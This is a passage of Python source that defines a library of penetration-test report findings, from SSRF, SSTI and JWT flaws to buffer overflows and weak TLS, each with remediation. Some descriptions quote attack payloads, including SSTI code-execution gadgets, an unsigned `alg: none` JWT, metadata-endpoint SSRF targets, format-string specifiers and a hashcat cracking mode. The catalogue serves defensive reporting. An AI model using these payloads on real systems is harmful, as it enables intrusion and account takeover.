            remediation="- Enable Azure Disk Encryption on every VM, backed by a customer-managed key in Azure Key Vault.\n- Apply Azure Policy `Disks should be encrypted with a customer-managed key` for ongoing enforcement.\n- Plan a controlled enablement window — first enablement reboots the VM.",
            references="https://learn.microsoft.com/en-us/azure/virtual-machines/disk-encryption-overview",
            cwe="CWE-311",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        # GCP entries — add the cloud type informally as extra_templates
        # since there's no dedicated gcp_cloud_vapt template yet. The
        # findings flow through the standard Cloud Review template.
        _f("cloud_review", "GCP — Default Service Account Used by Compute Instances", "Medium",
            description="One or more Compute Engine VMs run with the *default* Compute Service Account (`<project-num>-compute@developer.gserviceaccount.com`) attached, with the default `cloud-platform` scope. Code running on the VM (including via SSRF or arbitrary metadata-service access) inherits Project Editor-level permissions.",
            impact="A single compromised VM yields broad project-level access: read/write on Cloud Storage buckets, Pub/Sub topics, Secret Manager secrets, IAM management of other resources. Privilege escalation is one step.",
            remediation="- Create dedicated service accounts per workload, granted only the specific IAM roles each workload needs.\n- Detach the default Compute Service Account from every VM.\n- Set the organisation policy `iam.automaticIamGrantsForDefaultServiceAccounts` to deny so newly-created projects don't carry the default grants.",
            references="https://cloud.google.com/iam/docs/service-accounts-default",
            cwe="CWE-269",
            cvss_score=7.2,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),

        _f("cloud_review", "GCP — Cloud Storage Bucket with allUsers / allAuthenticatedUsers", "High",
            description="One or more Cloud Storage buckets grant `roles/storage.objectViewer` (or higher) to `allUsers` or `allAuthenticatedUsers`. The first makes every object publicly downloadable; the second exposes content to any authenticated Google account.",
            impact="Public exposure of bucket contents — at scale, this is one of the most common GCP data-loss vectors (matches the S3 public-bucket pattern in AWS).",
            remediation="- Remove `allUsers` / `allAuthenticatedUsers` bindings from every bucket and at the project IAM level.\n- Enforce `storage.publicAccessPrevention = enforced` on every bucket (org policy: `storage.publicAccessPrevention`).\n- Audit with Cloud Asset Inventory's `IamPolicyAnalysis` API for any remaining open buckets.",
            references="https://cloud.google.com/storage/docs/public-access-prevention",
            cwe="CWE-732",
            cvss_score=8.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ---- Thick Client (additional) ---------------------------------
    F.extend([
        _f("thick_client_pt", "Hardcoded Database Connection String in Binary", "High",
            description="`strings <app.exe>` (or `Reflector` decompile of a .NET assembly) reveals the production database connection string in cleartext: `Data Source=db01.corp;Initial Catalog=prod;User Id=sa;Password=…`. The connection string targets a production SQL Server and the credentials grant full database access.",
            impact="Anyone who can obtain the binary (laptop theft, app-store download for distributed clients, decompiled installer) reads production credentials. Often the credentials are shared across users, so rotation is operationally painful.",
            remediation="- Architect the application around a backend API; the thick client should never connect directly to the database. The API layer authenticates the user and applies row-level access controls.\n- Where direct DB access is unavoidable, source per-user credentials from an enterprise IdP at runtime (Windows Authentication via SSPI for SQL Server; Kerberos for Postgres / Oracle).\n- Never embed shared credentials in the binary.",
            references="https://cwe.mitre.org/data/definitions/798.html",
            cwe="CWE-798",
            cvss_score=7.7,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["source_code_review"]),

        _f("thick_client_pt", "Local Encryption Using Hardcoded Key / Improper DPAPI Usage", "Medium",
            description="Sensitive data is encrypted before being written to disk, but the key is either embedded in the binary as a literal byte array or derived from a hardcoded \"salt\" using `Rfc2898DeriveBytes(\"hardcoded-salt\")`. Where DPAPI is used, the entropy parameter (`additionalEntropy`) is omitted, so any process running as the same user can decrypt the data.",
            impact="Encryption is performative — anyone with the binary OR with code execution as the same user can decrypt the stored data. The intent (defend against casual disk access) is undermined.",
            remediation="- Derive keys from per-user / per-machine secrets unique to the deployment (Windows DPAPI with per-user scope + a strong `additionalEntropy`, Linux `libsecret`, macOS Keychain).\n- For multi-user data, use a hardware-backed key (TPM, Secure Enclave, YubiKey HMAC-SHA1 challenge-response).\n- Treat any value that lives in the binary as public.",
            references="https://cwe.mitre.org/data/definitions/922.html\nhttps://cwe.mitre.org/data/definitions/798.html",
            cwe="CWE-922",
            cvss_score=6.1,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("thick_client_pt", "Application Binary Not Code-Signed", "Medium",
            description="The shipped `.exe` / `.msi` has no Authenticode signature (verified via `signtool verify /pa <file>` returning \"No signature was present\"). Same on the .NET strong-name / on macOS where the `.app` bundle has no Developer ID Application signature.",
            impact="Tampered binaries cannot be distinguished from genuine ones via OS-level signature checks. End-user click-through warnings are louder ('publisher unknown'). Distribution channels (intranet, vendor portal) become an attractive insertion point for supply-chain compromise.",
            remediation="- Sign every released binary with a code-signing certificate (EV-class for kernel drivers / Windows SmartScreen reputation).\n- Verify signing at install time inside the installer itself.\n- For internal-distributed thick clients, integrate signing into the CI pipeline so unsigned binaries are never produced.",
            references="https://learn.microsoft.com/en-us/windows/win32/seccrypto/signtool\nhttps://cwe.mitre.org/data/definitions/494.html",
            cwe="CWE-494",
            cvss_score=5.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N"),

        _f("thick_client_pt", "Excessive Logging to User-Writable Path", "Low",
            description="The thick client writes verbose debug logs (full request bodies, password values redacted weakly, internal stack traces) to `%TEMP%\\app.log` or `~/Library/Logs/app.log` — both world-readable / per-user-writable. Log rotation is missing; the log retains weeks of activity.",
            impact="Co-resident malware / other users on a shared system / anyone who picks up a backup of the user profile sees the contents. On enterprise systems where log shipping is in place, sensitive content is duplicated to the SIEM.",
            remediation="- Sanitize log lines: redact known-sensitive fields (passwords, tokens, NRIC) before they reach the logger.\n- Cap log retention (size-based rotation, drop after N days).\n- Where the log MUST contain sensitive content for debugging, encrypt it at write-time and require explicit opt-in to enable.",
            references="https://cwe.mitre.org/data/definitions/532.html",
            cwe="CWE-532",
            cvss_score=4.4,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ============================================================
    # 2026-Q2 catalogue extension — SSRF, SSTI, JWT family,
    # hardcoded creds, business-logic, memory-safety (buffer overflow
    # / format string), and crypto downgrade (CBC, TLS 1.0/1.1).
    # Every entry below ships fully-written prose — no bracketed
    # prompts, no "DELETE IF IRRELEVANT", nothing the consultant
    # needs to rewrite. They only fill in `affected_asset`,
    # `poc_steps`, and confirm CVSS.
    # ============================================================
    F.extend([
        # ---- Server-Side Request Forgery (SSRF) ----
        _f("web_vapt", "Server-Side Request Forgery (SSRF)", "High",
            description="A request-issuing function on the application accepts a URL or hostname from user input and fetches it server-side without restricting the target. The server can therefore be coerced into issuing arbitrary outbound requests on the attacker's behalf — to internal RFC1918 ranges, cloud-metadata endpoints (`http://169.254.169.254/latest/meta-data/`), localhost-bound services (`http://127.0.0.1:6379/`), or back to a domain the attacker controls.\n\nSSRF most often surfaces in features that fetch a remote URL on the user's behalf: webhook configuration, link unfurling, image proxy, PDF generator, server-side OAuth callback, or any \"import from URL\" workflow.",
            impact="An attacker can reach services that are not directly internet-exposed, including cloud-metadata APIs (yielding short-lived IAM credentials on AWS / GCP / Azure), internal admin panels, the application's own database / Redis / SMB / SSH services, and other tenants on a shared egress. In cloud environments SSRF is the standard pivot from a single web flaw to full account compromise.",
            remediation="- Resolve the user-supplied hostname BEFORE the request and reject any IP in `127.0.0.0/8`, `169.254.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, link-local, multicast, or any address not on an explicit allow-list.\n- Re-resolve and re-validate at request time so a DNS rebinding attack does not bypass the check.\n- Disable HTTP redirects on the outbound client, or re-validate the redirect target the same way.\n- Run the fetching component in a network namespace whose egress is restricted to known destinations.\n- On AWS specifically, enforce IMDSv2 (`http_tokens=required`) so metadata cannot be reached by a single GET.",
            references="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\nhttps://portswigger.net/web-security/ssrf\nhttps://cwe.mitre.org/data/definitions/918.html",
            cwe="CWE-918", owasp="A10:2021",
            cvss_score=8.6,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["api_vapt", "aws_cloud_vapt", "azure_cloud_vapt"]),

        _f("web_vapt", "Server-Side Template Injection (SSTI)", "Critical",
            description="A server-side templating engine (Jinja2 / Twig / Freemarker / Velocity / Handlebars / ERB) renders untrusted user input as part of the TEMPLATE itself, not as a data value. Submitting a template expression such as `{{7*7}}` returns `49` in the rendered response — proof that the input is being evaluated rather than escaped.\n\nDepending on the engine, this primitive escalates rapidly to arbitrary code execution: in Jinja2 via `{{config.__class__.__mro__[1].__subclasses__()}}`, in Freemarker via `<#assign x=\"freemarker.template.utility.Execute\"?new()>`, in Twig via `{{_self.env.registerUndefinedFilterCallback(\"exec\")}}`.",
            impact="Full remote code execution on the application server. Reading source code, environment variables (including secrets), database credentials, and pivoting into the internal network are all trivial once SSTI is confirmed.",
            remediation="- Never concatenate user input into a template string. Pass user input as a CONTEXT VARIABLE to a pre-defined template instead (`render_template(\"page.html\", user_message=msg)`, not `render_template_string(\"Hello \" + msg)`).\n- Where dynamic templates are unavoidable, use a sandboxed engine (Jinja2's `SandboxedEnvironment`) and a minimal whitelist of allowed filters / globals.\n- Strip or escape engine-specific delimiters (`{{`, `{%`, `${`, `#{`, `<#`) before any value reaches a template stage.\n- Pen-test the resulting surface with each engine's known sandbox-escape payloads after deployment.",
            references="https://portswigger.net/research/server-side-template-injection\nhttps://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection\nhttps://cwe.mitre.org/data/definitions/1336.html",
            cwe="CWE-1336", owasp="A03:2021",
            cvss_score=9.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
            extra_templates=["api_vapt"]),

        # ---- JWT family (5 findings — cover the full attack surface) ----
        _f("api_vapt", "JWT Algorithm Confusion (RS256 → HS256 downgrade)", "Critical",
            description="The application accepts a JWT whose `alg` header has been changed from `RS256` (asymmetric, public-key verification) to `HS256` (symmetric, HMAC) without revalidating the algorithm against the key being used. Because HS256 verification uses the same key for both signing and verification, an attacker who knows the application's PUBLIC RSA key (often exposed through `/.well-known/jwks.json`, an SSL certificate, or a debug endpoint) can mint valid HMAC-signed tokens by HMAC-ing the new header+payload with the public key bytes as the secret.\n\nConfirmed by re-issuing the legitimate token with `{\"alg\":\"HS256\"}` and signing with the application's published public key — the server accepts it as authentic.",
            impact="Complete authentication bypass — the attacker can forge a token for any user, including administrators, without ever stealing a private key. Every protected endpoint that trusts the JWT is exposed.",
            remediation="- Pass an explicit allow-list of algorithms to the JWT library on every verify call (e.g. `jwt.decode(token, key, algorithms=[\"RS256\"])`). Never accept whatever `alg` is in the token header.\n- Separate the verification keys by algorithm: the public RSA key MUST NOT be reachable by an HMAC verifier.\n- Reject tokens whose `alg` does not match what the issuer is known to produce for that key.\n- Pin to RS256 / EdDSA for asymmetric and never advertise HS256 as a supported algorithm if it is not used.",
            references="https://portswigger.net/web-security/jwt/algorithm-confusion\nhttps://datatracker.ietf.org/doc/html/rfc8725\nhttps://cwe.mitre.org/data/definitions/347.html",
            cwe="CWE-347", owasp="API2:2023",
            cvss_score=9.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["web_vapt", "mobile_pt"]),

        _f("api_vapt", "JWT `alg: none` Accepted (Unsigned Token)", "Critical",
            description="The JWT verification library accepts tokens whose `alg` header is set to `none`. An attacker can craft a token with arbitrary claims, strip the signature, and the server still trusts the payload. Demonstrated by submitting `eyJhbGciOiJub25lIn0.<base64url(payload)>.` (empty signature) with `{\"sub\":\"admin\",\"role\":\"admin\"}` and receiving a 200 response on a protected endpoint.",
            impact="Total authentication bypass — any user identity, role, or scope can be impersonated without possessing any signing key. Equivalent to having the server's private key.",
            remediation="- Never include `none` in the algorithm allow-list passed to the JWT library.\n- Use a current version of the JWT library — older releases of `pyjwt`, `jsonwebtoken`, `jose4j`, and friends silently treated `alg: none` as valid.\n- Add an integration test that submits an `alg: none` token and asserts 401.",
            references="https://datatracker.ietf.org/doc/html/rfc8725#section-3.1\nhttps://www.howmanydayssinceajwtalgnonevuln.com/\nhttps://cwe.mitre.org/data/definitions/347.html",
            cwe="CWE-347", owasp="API2:2023",
            cvss_score=9.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["web_vapt", "mobile_pt"]),

        _f("api_vapt", "JWT HMAC Signed With Weak / Guessable Secret", "High",
            description="JWTs issued by the application use HS256 (HMAC-SHA-256) but the symmetric secret is short / dictionary-derived / a reused application string. Running an offline `hashcat -m 16500` attack against a captured token recovers the secret in minutes, after which an attacker can mint valid tokens for any subject and role.\n\nA recovered secret of `secret`, `changeme`, the application name, or anything matching a common-password list confirms this finding.",
            impact="Once the HMAC secret is known the attacker can forge tokens for any user — there is no further crypto barrier between them and full account takeover.",
            remediation="- Use at least 256 bits of entropy from a CSPRNG for HS256 secrets, or move to RS256 / EdDSA (asymmetric).\n- Source the secret from a secrets manager (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault) — never commit it to source control or bake it into a container image.\n- Rotate the secret on a documented schedule and after any suspected exposure; design the verification path to support overlapping keys during rotation.\n- For new deployments prefer asymmetric algorithms so even a database leak does not leak token-signing capability.",
            references="https://datatracker.ietf.org/doc/html/rfc8725#section-3.6\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://cwe.mitre.org/data/definitions/326.html",
            cwe="CWE-326", owasp="API2:2023",
            cvss_score=8.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["web_vapt", "mobile_pt"]),

        _f("api_vapt", "JWT Signature Not Verified by Application", "Critical",
            description="The application reads claims out of a JWT (sub, role, scope) but never verifies the signature — it base64-decodes the payload and trusts it. Demonstrated by tampering with the payload (changing `role: user` to `role: admin`), leaving the signature segment intact or even empty, and observing that the server honours the new claims.",
            impact="Every claim in the token is attacker-controlled. Authorization decisions based on the token are equivalent to a query-string `?role=admin` parameter.",
            remediation="- Always call the JWT library's full verify path (`jwt.decode(token, key, algorithms=[...])`), never `jwt.decode(token, options={\"verify_signature\": False})` outside of a debug context.\n- Have a single, audited identity-extraction helper that every route uses; ban ad-hoc payload reads.\n- Add an integration test that submits a tampered-payload token and asserts 401.",
            references="https://datatracker.ietf.org/doc/html/rfc8725\nhttps://cwe.mitre.org/data/definitions/347.html\nhttps://portswigger.net/web-security/jwt",
            cwe="CWE-347", owasp="API2:2023",
            cvss_score=9.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["web_vapt", "mobile_pt"]),

        _f("api_vapt", "JWT Key Confusion via `jwk` / `jku` / `x5u` Header", "High",
            description="The JWT verification library honours one of the key-injection header parameters defined by RFC 7515 — `jwk` (an embedded JWK in the header), `jku` (a URL the library fetches to retrieve a JWK set), or `x5u` (a URL the library fetches for an X.509 chain). An attacker generates their own key pair, signs a forged token, and supplies the matching public key inline (`jwk`) or at a URL they control (`jku`, `x5u`); the library uses the attacker-supplied key to verify and accepts the token as authentic.",
            impact="Complete authentication bypass identical to the `alg: none` and algorithm-confusion findings — any identity can be impersonated.",
            remediation="- Configure the JWT library to ignore `jwk`, `jku`, `x5u`, and `x5c` headers entirely. Verify only against keys the application has on disk or in its trusted JWKS.\n- If `jku` / `x5u` MUST be supported, restrict the fetch to an explicit allow-list of issuer URLs and pin certificates / hashes.\n- Validate the `kid` header against a fixed key registry rather than dereferencing it as a URL.",
            references="https://datatracker.ietf.org/doc/html/rfc8725#section-3.5\nhttps://portswigger.net/web-security/jwt/algorithm-confusion#jwk-header-injection\nhttps://cwe.mitre.org/data/definitions/347.html",
            cwe="CWE-347", owasp="API2:2023",
            cvss_score=8.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
            extra_templates=["web_vapt", "mobile_pt"]),

        # ---- Hardcoded credentials (source code review) ----
        _f("source_code_review", "Hardcoded Credentials in Source Code", "High",
            description="Source-code review identified credentials, API keys, or signing secrets stored verbatim in repository files. Concrete examples found included database passwords in connection-string constants, third-party API keys in JavaScript bundles shipped to the client, AWS/Azure access keys in deployment scripts, and JWT signing secrets defined as module-level Python constants.\n\nGit history confirms the secrets were present in earlier commits, so the leak window extends back beyond the current HEAD.",
            impact="Anyone with read access to the repository — internal developer, contractor, ex-employee, or anyone who lifts a backup or laptop — has full credentials to the upstream service. For secrets shipped to the browser (frontend bundles, mobile binaries), the audience expands to every end user. Once committed, credentials cannot be unleaked by simply deleting them in a later commit; the value must be rotated.",
            remediation="- Move every secret to a dedicated secrets manager (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault, Kubernetes Secrets). The application reads them at start-up; the value never appears in source.\n- Rotate every credential identified in the audit — assume a leaked secret is compromised even if no abuse has been observed yet.\n- Add a pre-commit hook (`gitleaks`, `trufflehog`, `detect-secrets`) and a CI gate that blocks PRs which introduce a new secret pattern.\n- For frontend / mobile builds, route all calls that require a key through a server-side proxy so the key never reaches the client.\n- Rewrite git history (`git filter-repo`) to scrub the original commit if the repository is or was public — force-push and notify collaborators.",
            references="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\nhttps://cwe.mitre.org/data/definitions/798.html\nhttps://github.com/zricethezav/gitleaks",
            cwe="CWE-798", owasp="A02:2021",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N",
            extra_templates=["web_vapt", "api_vapt", "mobile_pt", "thick_client_pt"]),

        # ---- Business logic misconfiguration ----
        _f("web_vapt", "Business Logic Flaw — Insufficient Workflow Authorization", "High",
            description="The application's state machine relies on the order in which the client submits requests, rather than enforcing the workflow on the server side. By skipping a step, replaying a step out of order, or calling a later step's endpoint directly, an attacker bypasses validation that the application assumed had already occurred.\n\nTypical instances observed in this engagement include: invoking a payment-confirmation endpoint without completing the payment-authorization step, jumping directly from cart to order-fulfilment without checkout, and re-submitting a one-time discount workflow to apply a coupon multiple times. The vulnerability does not show up against an OWASP-style checklist of \"injection / XSS / SSRF\" because every individual request is well-formed — it is the SEQUENCE that is illegal.",
            impact="Depending on the workflow, an attacker can obtain goods or services without payment, escalate privileges by skipping verification steps, or exhaust a single-use resource (coupon / referral / one-time bonus) repeatedly. Direct revenue loss in commercial applications and policy circumvention in regulated workflows are the most common outcomes.",
            remediation="- Maintain workflow state on the SERVER, keyed by user / session, and check it on entry to every step. The client should not be able to advance the state machine by guessing the next endpoint URL.\n- Encode the allowed transitions explicitly (a finite-state-machine table or library) rather than relying on the absence of validation as a guard.\n- Treat every step's pre-conditions as a hard server-side check, even when the previous step was supposedly performed.\n- Add integration tests that submit every endpoint out of order and assert the server rejects the request.",
            references="https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability\nhttps://portswigger.net/web-security/logic-flaws\nhttps://cwe.mitre.org/data/definitions/840.html",
            cwe="CWE-840", owasp="A04:2021",
            cvss_score=7.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt", "mobile_pt"]),

        _f("web_vapt", "Race Condition in Single-Use Workflow", "High",
            description="A workflow that is supposed to be single-use per identifier (one-time discount redemption, balance withdrawal, vote, registration of a unique handle) does not serialise access to the underlying resource. Sending many concurrent requests with the same identifier — easily reproduced via Burp Intruder's \"single packet attack\" or 50 parallel `curl` invocations — causes the action to succeed multiple times before the server-side guard updates the state.",
            impact="Single-use resources are consumed multiple times, leading to direct financial loss (multi-redeemed coupons, double-withdrawn balances), policy breaches (multi-cast votes), or duplicate identifiers in supposedly-unique fields.",
            remediation="- Wrap the read-modify-write in a single transaction with a row-level lock (`SELECT ... FOR UPDATE`) or use a unique constraint that the second concurrent insert violates.\n- Use an optimistic-concurrency token (version column) and retry the loser of a collision.\n- Where the resource lives outside the relational DB, use a distributed lock (Redis `SET NX` with a TTL).\n- Add a load-test step that fires N parallel requests at the workflow and asserts the resource is consumed exactly once.",
            references="https://portswigger.net/web-security/race-conditions\nhttps://owasp.org/www-community/vulnerabilities/Race_Conditions\nhttps://cwe.mitre.org/data/definitions/362.html",
            cwe="CWE-362",
            cvss_score=7.4,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["api_vapt", "mobile_pt"]),

        # ---- Memory-safety bugs (thick client + source code review) ----
        _f("thick_client_pt", "Stack-Based Buffer Overflow in Native Component", "Critical",
            description="A C/C++ native component of the thick client reads attacker-controlled input into a fixed-size stack buffer using a length-unaware copy primitive (`strcpy`, `strcat`, `sprintf`, `gets`, or a hand-rolled `memcpy` with a length derived from the input itself). Sending an input longer than the buffer overruns adjacent stack frames, corrupting the saved return address and / or stack canaries.\n\nWhere stack-protector (`-fstack-protector`) is enabled the application aborts with `*** stack smashing detected ***`; where it is not, the process pivots to attacker-controlled execution.",
            impact="Arbitrary code execution in the security context of the user running the application — at minimum a reliable crash / DoS. On Windows clients without ASLR or DEP this typically yields a working exploit; on hardened modern builds it remains a strong primitive for chained exploitation.",
            remediation="- Replace every unbounded copy with a length-aware equivalent: `strncpy_s`, `strlcpy`, `snprintf`, `memcpy_s`. Make the source-bound the SIZE of the DESTINATION, not the length of the input.\n- Compile with `-fstack-protector-strong -D_FORTIFY_SOURCE=2 -Wformat -Wformat-security` and enable ASLR + DEP / NX in the linker options (`/DYNAMICBASE /NXCOMPAT` on MSVC).\n- For new code prefer memory-safe languages (Rust, Go) for any module that touches untrusted input.\n- Add fuzz tests against the input parser (`libFuzzer`, `AFL++`) and run them in CI.",
            references="https://cwe.mitre.org/data/definitions/121.html\nhttps://owasp.org/www-community/attacks/Buffer_overflow_attack\nhttps://learn.microsoft.com/en-us/cpp/c-runtime-library/security-features-in-the-crt",
            cwe="CWE-121",
            cvss_score=9.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["source_code_review"]),

        _f("thick_client_pt", "Format String Vulnerability", "High",
            description="A `printf`-family function (`printf`, `fprintf`, `sprintf`, `syslog`, `NSLog`) is called with attacker-controlled data passed AS THE FORMAT STRING rather than as a value argument. Submitting an input containing `%x %x %x %x %s` causes the function to read additional words off the stack, yielding memory disclosure; the `%n` specifier writes the count of bytes printed so far to an attacker-influenced address, yielding arbitrary write.",
            impact="Memory disclosure (leaks stack canaries, ASLR base addresses, sensitive in-memory data) and, via `%n`, arbitrary memory write — which generally upgrades to code execution. Bypasses many modern mitigations because `printf` already runs with the privileges of the caller.",
            remediation="- Treat the format string as a CODE PATH that must never be sourced from input. Always pass a fixed literal as the first argument: `printf(\"%s\", user_input)`, never `printf(user_input)`.\n- Compile with `-Wformat -Wformat-security -Werror=format-security` so the compiler refuses to build the unsafe pattern.\n- Where logging primitives must accept dynamic format strings, build them through a wrapper that always inserts a leading `%s`.\n- Static-analyse the codebase with `clang-tidy bugprone-string-format` or commercial tools (Coverity, Checkmarx) to find historical instances.",
            references="https://cwe.mitre.org/data/definitions/134.html\nhttps://owasp.org/www-community/attacks/Format_string_attack\nhttps://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html",
            cwe="CWE-134",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["source_code_review"]),

        # ---- Crypto downgrade / deprecated cipher findings ----
        _f("infra_vapt", "Weak CBC Cipher Suites Enabled on TLS Endpoint", "Medium",
            description="TLS testing of the service (`nmap --script ssl-enum-ciphers -p 443 <host>` / `testssl.sh`) shows that CBC-mode cipher suites are accepted (e.g. `TLS_RSA_WITH_AES_128_CBC_SHA`, `TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA`). CBC implementations in TLS 1.0 / 1.1 were the vector for the BEAST, Lucky-13, and POODLE attacks, and CBC suites in any TLS version produce padding-oracle and timing side-channel exposure when the implementation is imperfect.",
            impact="A network attacker positioned to MITM or to perform a downgrade can attempt to recover plaintext via padding-oracle / timing attacks. Even where successful exploitation is difficult on the latest TLS stacks, accepting CBC fails most compliance baselines (PCI-DSS, MAS TRM, ISO 27001 control-listing) and signals a stale TLS configuration.",
            remediation="- Disable CBC suites at the server entirely. Prefer authenticated-encryption AEAD ciphers: `TLS_AES_128_GCM_SHA256`, `TLS_AES_256_GCM_SHA384`, `TLS_CHACHA20_POLY1305_SHA256` (TLS 1.3) and `TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256` / `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384` (TLS 1.2).\n- Re-test with `testssl.sh --severity HIGH` and `nmap --script ssl-enum-ciphers` after the change.\n- Pull configuration from the Mozilla SSL Configuration Generator's INTERMEDIATE or MODERN profile for the server's product family.",
            references="https://wiki.mozilla.org/Security/Server_Side_TLS\nhttps://datatracker.ietf.org/doc/html/rfc7457\nhttps://cwe.mitre.org/data/definitions/327.html",
            cwe="CWE-327",
            cvss_score=5.1,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["web_vapt", "api_vapt", "aws_cloud_vapt", "azure_cloud_vapt"]),

        _f("infra_vapt", "TLS 1.0 / 1.1 Enabled on Service", "Medium",
            description="The service negotiates TLS 1.0 and / or TLS 1.1. Both protocols were formally deprecated by RFC 8996 (March 2021), are no longer permitted by PCI-DSS, and were end-of-life'd by every major browser vendor in 2020. Their cipher suite set is built on weak primitives (MD5 / SHA-1 in PRF, mandatory CBC) and they cannot negotiate the modern AEAD suites.",
            impact="Clients that fall back to TLS 1.0 / 1.1 (either by attacker-induced downgrade or by being legitimately old) are exposed to BEAST, Lucky-13, POODLE-style attacks, and to the well-known weaknesses of SHA-1 / MD5 used in their record-protection PRF. Compliance regimes (PCI-DSS 3.2.1+, MAS TRM, FedRAMP) explicitly prohibit them.",
            remediation="- Set the minimum TLS version at the server / load-balancer / WAF to 1.2 (and prefer 1.3). On nginx: `ssl_protocols TLSv1.2 TLSv1.3;`. On Apache: `SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1`. On AWS ELB: select a security policy that excludes 1.0 / 1.1 (e.g. `ELBSecurityPolicy-TLS13-1-2-2021-06`).\n- For any genuinely-legacy client that requires 1.0 / 1.1, isolate it on a dedicated endpoint with monitoring; do not lower the bar on the main service.\n- Verify with `nmap --script ssl-enum-ciphers` or `testssl.sh`.",
            references="https://datatracker.ietf.org/doc/html/rfc8996\nhttps://wiki.mozilla.org/Security/Server_Side_TLS\nhttps://cwe.mitre.org/data/definitions/327.html",
            cwe="CWE-327",
            cvss_score=5.1,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["web_vapt", "api_vapt", "aws_cloud_vapt", "azure_cloud_vapt"]),

        # ============================================================
        # 2026-Q3 Infra grouped findings — the "Infra Scan Pipeline"
        # feature creates these three rolled-up findings on every
        # Infra VA / Infra VAPT report and attaches a per-category
        # Excel sheet to each. The Excel sheet enumerates every
        # individual scan hit that fell into that bucket so the
        # consultant can audit + re-upload after manual review.
        #
        # These rows live at the LIBRARY level so consultants can
        # also pull them in manually (e.g. for a non-pipeline scan
        # write-up). Both Infra VA and Infra VAPT include them
        # because the categorisation logic is identical — a Nessus
        # SSL/cert finding is the same vulnerability whether the
        # engagement is VA-only or VA+PT.
        # ============================================================
        _f("infra_vapt", "Outdated / Unsupported Software Versions (Grouped)", "High",
            description="It was noted that there were missing security patches and unsupported operating system and application versions installed on the affected hosts. The full list — including the affected host, the product / KB / patch identifier, the observed version, and the recommended fix version — is provided in the attached workbook.",
            impact="Outdated security patches and software versions will result in risks and vulnerabilities, as there are no vendor protections in place for the affected systems. Each unpatched component carries the public exploit history of every CVE disclosed against its version range, and an attacker who compromises one such host typically pivots to systems that share credentials, trust relationships, or the same management network.",
            remediation="It is recommended to update or patch each affected component to the latest vendor-supported version. Where an upgrade cannot land immediately, raise a tracked risk-acceptance with a target remediation date and a compensating control. Stand up a recurring patch-management process so missing patches surface within an agreed SLA, and re-scan after remediation to confirm each row in the workbook is resolved.",
            references="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\nhttps://cwe.mitre.org/data/definitions/1104.html",
            cwe="CWE-1104", owasp="A06:2021",
